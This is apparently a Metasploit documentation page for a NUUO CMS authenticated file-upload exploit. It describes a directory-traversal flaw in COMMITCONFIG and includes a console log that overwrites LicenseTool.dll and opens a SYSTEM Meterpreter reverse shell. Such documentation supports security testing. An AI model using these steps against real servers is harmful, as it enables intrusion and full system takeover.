{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/nuuo/nuuo_cms_fu","result":{"data":{"moduleMetadataJson":{"id":"cdb54ea5-4717-5cbc-ab84-748a8bc03cba","name":"Nuuo Central Management Server Authenticated Arbitrary File Upload","fullname":"exploit/windows/nuuo/nuuo_cms_fu","description":"The COMMITCONFIG verb is used by a CMS client to upload and modify the configuration of the\n      CMS Server.\n      The vulnerability is in the \"FileName\" parameter, which accepts directory traversal (..\\..\\)\n      characters. Therefore, this function can be abused to overwrite any files in the installation\n      drive of CMS Server.\n\n      This vulnerability is exploitable in CMS versions up to and including v2.4.\n\n      This module will either use a provided session number (which can be guessed with an auxiliary\n      module) or attempt to login using a provided username and password - it will also try the\n      default credentials if nothing is provided.\n\n      This module will overwrite the LicenseTool.dll file in the CMS Server installation. If the module\n      fails to restore LicenseTool.dll then the installation will be corrupted and NCS Server will\n      not execute successfully.","rank":0,"fields":{"detailsSlug":"/modules/details/exploit/windows/nuuo/nuuo_cms_fu","documentationSlug":"/modules/documentation/exploit/windows/nuuo/nuuo_cms_fu","referencesSlug":"/modules/references/exploit/windows/nuuo/nuuo_cms_fu"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Nuuo CMS Authenticated Arbitrary File Upload</p>\n<p>The COMMITCONFIG verb is used by a CMS client to upload and modify the configuration of the CMS Server. An example is below:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">COMMITCONFIG NUCM/1.0\nUser-Session-No: &lt;session-number&gt;\nFilename: &lt;filename&gt;\nFileType: &lt;number&gt;\nContent-Lenght: &lt;file-length&gt;\n\n&lt;FILE_DATA&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>The vulnerability is in the \"FileName\" parameter, which accepts directory traversal (..\\..\\) characters. Therefore, this function can be abused to overwrite any files in the installation drive of CMS Server.</p>\n<p>This vulnerability is exploitable in CMS versions up to and including v2.4.</p>\n<p>This module will either use a provided session number (which can be guessed with an auxiliary module) or attempt to login using a provided username and password - it will also try the default credentials if nothing is provided.</p>\n<p><a href=\"http://d1.nuuo.com/NUUO/CMS/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">NUUO Central Management Server (CMS): all versions below 2.5</a></p>\n<ul>\n<li>1.5.2 OK</li>\n<li>2.1.0 OK</li>\n<li>2.3.2 OK</li>\n<li>2.4.0 OK</li>\n<li>2.6.0 FAIL (vuln fixed?)</li>\n<li>2.9.0 FAIL</li>\n<li>2.10.0 FAIL</li>\n</ul>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"testing-on-windows-10-pro-x64-running-ncs-server-240\" style=\"position:relative;\"><a href=\"#testing-on-windows-10-pro-x64-running-ncs-server-240\" aria-label=\"testing on windows 10 pro x64 running ncs server 240 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Testing on Windows 10 Pro x64 running NCS Server 2.4.0</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(windows/nuuo/nuuo_cms_fu) &gt; set rhosts 172.22.222.200\nrhosts =&gt; 172.22.222.200\nmsf5 exploit(windows/nuuo/nuuo_cms_fu) &gt; set verbose true\nverbose =&gt; true\nmsf5 exploit(windows/nuuo/nuuo_cms_fu) &gt; exploit\n\n[*] Started reverse TCP handler on 172.22.222.136:4444 \n[*] 172.22.222.200:5180 - Backing up LicenseTool.dll to TQzixBdpOiRG\n[*] 172.22.222.200:5180 - Uploading payload...\n[*] 172.22.222.200:5180 - Sleeping 15 seconds...\n[*] 172.22.222.200:5180 - Sending SENDLICFILE request, shell incoming!\n[*] Sending stage (179779 bytes) to 172.22.222.200\n[*] Meterpreter session 3 opened (172.22.222.136:4444 -&gt; 172.22.222.200:49674) at 2019-02-19 05:46:51 -0600\n\nmeterpreter &gt; \n[!] 172.22.222.200:5180 - Please wait a bit while we clean up\n[+] 172.22.222.200:5180 - Successfully restored LicenseTool.dll!\n...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).\n[+] 172.22.222.200:5180 - We should have SYSTEM now, enjoy your shell!\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt; sysinfo\nComputer        : DESKTOP-IPOGIJR\nOS              : Windows 10 (Build 17763).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/windows\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"cdb54ea5-4717-5cbc-ab84-748a8bc03cba"}}}